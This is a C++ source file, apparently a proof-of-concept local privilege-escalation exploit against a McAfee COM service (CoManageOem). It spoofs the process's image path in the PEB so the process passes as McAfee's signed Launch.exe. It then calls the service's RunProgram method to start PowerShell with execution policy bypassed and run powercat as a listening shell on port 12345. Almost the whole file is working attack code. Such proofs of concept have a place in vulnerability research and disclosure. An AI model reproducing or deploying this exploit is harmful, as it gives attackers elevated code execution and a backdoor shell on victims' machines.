// CoManageOemExploit.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include "wil/stl.h"
#include "wil/win32_helpers.h"
#include <winternl.h>
#include <comdef.h>
#include <string>
#include <filesystem>
#include <iostream>

namespace fs = std::filesystem;

constexpr auto McLaunchExePath = LR"(C:\Program Files\McAfee\CoreUI\Launch.exe)"; // Your/path/to/Launch.exe

namespace
{
    void MasqueradeImagePath(PCWCHAR imagePath)
    {
        PROCESS_BASIC_INFORMATION processBasicInformation;
        ULONG processInformationLength;

        auto ntStatus = ::NtQueryInformationProcess(
            ::GetCurrentProcess(),
            ProcessBasicInformation,
            &processBasicInformation,
            sizeof(processBasicInformation),
            &processInformationLength);
        if (!NT_SUCCESS(ntStatus))
            throw std::runtime_error("NtQueryInformationProcess failed. Error: " + std::to_string(ntStatus));

        UNICODE_STRING usImagePath;
        RtlInitUnicodeString(&usImagePath, imagePath);

        /*
        processBasicInformation.PebBaseAddress->ProcessParameters->ImagePathName = usImagePath;
        processBasicInformation.PebBaseAddress->ProcessParameters->CommandLine = usImagePath;
        */

        auto moduleBase = ::GetModuleHandle(NULL);
        if (!moduleBase)
            throw std::runtime_error("GetModuleHandle failed. Error: " + std::to_string(::GetLastError()));

        auto pPeb = processBasicInformation.PebBaseAddress;
        auto pLdr = pPeb->Ldr;
        auto pLdrHead = &pLdr->InMemoryOrderModuleList;
        auto pLdrNext = pLdrHead->Flink;

        while (pLdrNext != pLdrHead)
        {
            PLDR_DATA_TABLE_ENTRY LdrEntry = CONTAINING_RECORD(pLdrNext, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            if (LdrEntry->DllBase == moduleBase)
            {
                LdrEntry->FullDllName = usImagePath;
                break;
            }

            pLdrNext = LdrEntry->InMemoryOrderLinks.Flink;
        }
    }
}

class __declspec(uuid("fd542581-722e-45be-bed4-62a1be46af03")) IMcClassFactory : public IUnknown
{
public:
    virtual HRESULT __stdcall InternalCreateObject(_In_ REFIID riid, _COM_Outptr_ void **ppvObject);
};

class __declspec(uuid("9b6c414a-799d-4506-87d1-6eb78d0a3580")) IManageOem : public IDispatch
{
public:
    virtual HRESULT Proc7(/* Stack Offset: 8 */ /*[Out]*/ BSTR *p0);
    virtual HRESULT Proc8(/* Stack Offset: 8 */ /*[Out]*/ BSTR *p0);
    virtual HRESULT Proc9(/* Stack Offset: 8 */ /*[Out]*/ BSTR *p0);
    virtual HRESULT Proc10(/* Stack Offset: 8 */ /*[Out]*/ BSTR *p0);
    virtual HRESULT Proc11(/* Stack Offset: 8 */ /*[Out]*/ short *p0);
    virtual HRESULT Proc12(/* Stack Offset: 8 */ /*[In]*/ short p0);
    virtual HRESULT Proc13(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ BSTR *p1);
    virtual HRESULT RunProgram(/* Stack Offset: 8 */ /*[In]*/ BSTR bstrExePath, /* Stack Offset: 16 */ /*[In]*/ BSTR bstrCmdLine, /* Stack Offset: 24 */ /*[Out]*/ /* ENUM16 */ int *returnCode);
    virtual HRESULT Proc15(/* Stack Offset: 8 */ /*[Out]*/ short *p0);
    virtual HRESULT Proc16(/* Stack Offset: 8 */ /*[Out]*/ BSTR *p0);
    virtual HRESULT Proc17(/* Stack Offset: 8 */ /*[Out]*/ short *p0);
    virtual HRESULT Proc18(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ BSTR *p1);
    virtual HRESULT Proc19(/* Stack Offset: 8 */ /*[Out]*/ /* ENUM16 */ int *p0);
    virtual HRESULT Proc20(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ BSTR *p1);
    virtual HRESULT RunProgramAndWait(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[In]*/ BSTR p1, /* Stack Offset: 24 */ /*[Out]*/ VARIANT *p2);
    virtual HRESULT RunProgramAndWaitEx(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[In]*/ BSTR p1, /* Stack Offset: 24 */ /*[In]*/ BSTR p2, /* Stack Offset: 32 */ /*[Out]*/ VARIANT *p3);
    virtual HRESULT Proc23(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ short *p1);
    virtual HRESULT RegCreateKey(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ /* ENUM16 */ int *p1);
    virtual HRESULT RegDeleteKey(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ /* ENUM16 */ int *p1);
    virtual HRESULT Proc26(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ LPSAFEARRAY *p1);
    virtual HRESULT Proc27(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ VARIANT *p1, /* Stack Offset: 24 */ /*[Out]*/ VARIANT *p2, /* Stack Offset: 32 */ /*[Out]*/ /* ENUM16 */ int *p3);
    virtual HRESULT RegSetValue(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[In]*/ BSTR p1, /* Stack Offset: 24 */ /*[In]*/ VARIANT *p2, /* Stack Offset: 32 */ /*[Out]*/ /* ENUM16 */ int *p3);
    virtual HRESULT RegDeleteValue(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[In]*/ BSTR p1, /* Stack Offset: 24 */ /*[Out]*/ /* ENUM16 */ int *p2);
    virtual HRESULT Proc30(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ LPSAFEARRAY *p1);
    virtual HRESULT Proc31(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[In]*/ BSTR p1, /* Stack Offset: 24 */ /*[Out]*/ VARIANT *p2);
    virtual HRESULT IniWriteValue(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[In]*/ BSTR p1, /* Stack Offset: 24 */ /*[In]*/ BSTR p2, /* Stack Offset: 32 */ /*[In]*/ VARIANT *p3, /* Stack Offset: 40 */ /*[Out]*/ /* ENUM16 */ int *p4);
    virtual HRESULT Proc33(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[In]*/ BSTR p1, /* Stack Offset: 24 */ /*[In]*/ BSTR p2, /* Stack Offset: 32 */ /*[Out]*/ VARIANT *p3);
    virtual HRESULT Proc34(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[In]*/ BSTR p1, /* Stack Offset: 24 */ /*[Out]*/ LPSAFEARRAY *p2);
    virtual HRESULT IniDeleteSection(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[In]*/ BSTR p1, /* Stack Offset: 24 */ /*[Out]*/ /* ENUM16 */ int *p2);
    virtual HRESULT Proc36(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ LPSAFEARRAY *p1);
    virtual HRESULT Proc37(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ BSTR *p1);
    virtual HRESULT Proc38(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ short *p1);
    virtual HRESULT RemoveFiles(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ short *p1);
    virtual HRESULT Proc40(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ LPSAFEARRAY *p1);
    virtual HRESULT CopyFiles(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[In]*/ BSTR p1, /* Stack Offset: 24 */ /*[In]*/ short p2, /* Stack Offset: 32 */ /*[Out]*/ short *p3);
    virtual HRESULT RemoveFolder(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[In]*/ short p1, /* Stack Offset: 24 */ /*[Out]*/ short *p2);
    virtual HRESULT Proc43(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ short *p1);
    virtual HRESULT SetFileAttributes(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[In]*/ int p1, /* Stack Offset: 24 */ /*[Out]*/ short *p2);
    virtual HRESULT Proc45(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ VARIANT *p1, /* Stack Offset: 24 */ /*[Out]*/ short *p2);
    virtual HRESULT Proc46(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ short *p1);
    virtual HRESULT Proc47(/* Stack Offset: 8 */ /*[In]*/ /* ENUM16 */ int p0, /* Stack Offset: 16 */ /*[Out]*/ VARIANT *p1, /* Stack Offset: 24 */ /*[Out]*/ /* ENUM16 */ int *p2);
    virtual HRESULT Proc48(/* Stack Offset: 8 */ /*[Out]*/ BSTR *p0);
    virtual HRESULT Proc49(/* Stack Offset: 8 */ /*[Out]*/ BSTR *p0);
    virtual HRESULT Proc50(/* Stack Offset: 8 */ /*[Out]*/ BSTR *p0);
    virtual HRESULT Proc51(/* Stack Offset: 8 */ /*[In]*/ BSTR p0);
    virtual HRESULT Proc52(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ short *p1);
    virtual HRESULT Proc53();
    virtual HRESULT Proc54(/* Stack Offset: 8 */ /*[In]*/ short p0);
    virtual HRESULT Proc55(/* Stack Offset: 8 */ /*[Out]*/ IDispatch **p0);
    virtual HRESULT Proc56(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[In]*/ BSTR p1, /* Stack Offset: 24 */ /*[In]*/ BSTR p2, /* Stack Offset: 32 */ /*[Out]*/ /* ENUM16 */ int *p3);
    virtual HRESULT Proc57(/* Stack Offset: 8 */ /*[Out]*/ BSTR *p0);
    virtual HRESULT Proc58(/* Stack Offset: 8 */ /*[Out]*/ short *p0);
    virtual HRESULT Proc59(/* Stack Offset: 8 */ /*[Out]*/ IDispatch **p0);
    virtual HRESULT Proc60(/* Stack Offset: 8 */ /*[Out]*/ VARIANT *p0);
    virtual HRESULT Proc61(/* Stack Offset: 8 */ /*[In]*/ VARIANT *p0);
    virtual HRESULT Proc62(/* Stack Offset: 8 */ /*[Out]*/ VARIANT *p0);
    virtual HRESULT Proc63(/* Stack Offset: 8 */ /*[In]*/ VARIANT *p0);
    virtual HRESULT Proc64(/* Stack Offset: 8 */ /*[Out]*/ BSTR *p0);
    virtual HRESULT Proc65(/* Stack Offset: 8 */ /*[Out]*/ BSTR *p0);
    virtual HRESULT Proc66(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[In]*/ BSTR p1, /* Stack Offset: 24 */ /*[In]*/ BSTR p2, /* Stack Offset: 32 */ /*[Out]*/ VARIANT *p3);
    virtual HRESULT CreateTaskScheduleEntry(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[In]*/ VARIANT *p1, /* Stack Offset: 24 */ /*[In]*/ VARIANT *p2);
    virtual HRESULT DeleteTask(/* Stack Offset: 8 */ /*[In]*/ BSTR p0);
    virtual HRESULT Proc69(/* Stack Offset: 8 */ /*[Out]*/ BSTR *p0);
    virtual HRESULT Proc70(/* Stack Offset: 8 */ /*[Out]*/ BSTR *p0);
    virtual HRESULT Proc71(/* Stack Offset: 8 */ /*[Out]*/ BSTR *p0);
    virtual HRESULT ReadFile(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[In]*/ short p1, /* Stack Offset: 24 */ /*[Out]*/ BSTR *p2);
    virtual HRESULT Proc73(/* Stack Offset: 8 */ /*[Out]*/ BSTR *p0);
    virtual HRESULT Proc74(/* Stack Offset: 8 */ /*[Out]*/ short *p0);
    virtual HRESULT Proc75(/* Stack Offset: 8 */ /*[Out]*/ BSTR *p0);
    virtual HRESULT Proc76(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ BSTR *p1, /* Stack Offset: 24 */ /*[Out]*/ int *p2);
    virtual HRESULT Proc77(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[In]*/ int p1, /* Stack Offset: 24 */ /*[Out]*/ short *p2);
    virtual HRESULT Proc78(/* Stack Offset: 8 */ /*[In]*/ BSTR p0, /* Stack Offset: 16 */ /*[Out]*/ BSTR *p1);
    virtual HRESULT Proc79(/* Stack Offset: 8 */ /*[Out]*/ BSTR *p0);
    virtual HRESULT Proc80(/* Stack Offset: 8 */ /*[In]*/ int p0, /* Stack Offset: 16 */ /*[Out]*/ int *p1);
};

_COM_SMARTPTR_TYPEDEF(IMcClassFactory, __uuidof(IMcClassFactory));
_COM_SMARTPTR_TYPEDEF(IManageOem, __uuidof(IManageOem));

int main()
{
    try
    {
        HRESULT hr = ::CoInitializeEx(0, COINIT_MULTITHREADED);
        if (FAILED(hr))
            throw std::runtime_error("CoInitializeEx failed. Error: " + std::to_string(hr));
        auto coUninitializeOnExit = wil::scope_exit([] {::CoUninitialize(); });

        const GUID CLSID_CoManageOem = { 0x77b97c6a, 0xcd4e, 0x452c, { 0x8d, 0x99, 0x08, 0xa9, 0x2f, 0x1d, 0x8c, 0x83 } };
        IMcClassFactoryPtr pMcClassFactory;

        hr = ::CoGetClassObject(CLSID_CoManageOem, CLSCTX_LOCAL_SERVER, nullptr, IID_PPV_ARGS(&pMcClassFactory));
        if (FAILED(hr))
            throw std::runtime_error("CoGetClassObject failed. Error: " + std::to_string(hr));

        const auto thisModulePath = fs::path(wil::GetModuleFileNameW<std::wstring>(NULL));
        auto thisModuleParentDirectoryPath = thisModulePath.parent_path();

        auto mcAfeeSignedImagePath = McLaunchExePath;
        MasqueradeImagePath(mcAfeeSignedImagePath);

        IManageOemPtr pManageOem;

        hr = pMcClassFactory->InternalCreateObject(__uuidof(pManageOem), reinterpret_cast<LPVOID *>(&pManageOem));
        if (FAILED(hr))
            throw std::runtime_error("InternalCreateObject failed. Error: " + std::to_string(hr));

        auto cmdLineString = std::wstring(LR"(-nop -ep bypass -c ". )") + (thisModuleParentDirectoryPath / L"powercat.ps1").wstring() + LR"(;powercat -l -p 12345 -ep")";

        auto exePath = ::SysAllocString(LR"(C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe)");
        auto cmdLine = ::SysAllocString(cmdLineString.c_str());
        auto freeBstrStringsOnExit = wil::scope_exit([exePath, cmdLine] { ::SysFreeString(exePath); ::SysFreeString(cmdLine); });

        int errorCode;

        hr = pManageOem->RunProgram(exePath, cmdLine, &errorCode);
        if (FAILED(hr))
            throw std::runtime_error("RunProgram failed. Error: " + std::to_string(hr));
    }
    catch (const std::exception &e)
    {
        std::cerr << "Exception: " << e.what() << std::endl;
        return -1;
    }

    return 0;
}
